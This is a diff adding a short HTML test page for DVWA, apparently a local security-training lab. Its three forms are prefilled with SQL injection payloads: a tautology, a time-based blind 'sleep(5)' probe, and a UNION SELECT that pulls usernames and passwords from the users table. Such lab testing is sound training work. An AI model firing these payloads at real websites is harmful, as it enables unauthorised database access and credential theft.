@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>DVWA SQL Injection Test</title>
+</head>
+<body>
+    <h2>DVWA SQL Injection Tests</h2>
+    
+    <h3>GET-based SQL Injection</h3>
+    <form action="http://localhost/vulnerabilities/sqli/" method="GET">
+        <input type="text" name="id" value="1' OR '1'='1">
+        <input type="submit" name="Submit" value="Submit">
+    </form>
+
+    <h3>Blind SQL Injection</h3>
+    <form action="http://localhost/vulnerabilities/sqli_blind/" method="GET">
+        <input type="text" name="id" value="1' AND sleep(5) #">
+        <input type="submit" name="Submit" value="Submit">
+    </form>
+
+    <h3>Union-based SQL Injection</h3>
+    <form action="http://localhost/vulnerabilities/sqli/" method="GET">
+        <input type="text" name="id" value="' UNION SELECT user,password FROM users #">
+        <input type="submit" name="Submit" value="Submit">
+    </form>
+</body>
+</html> 
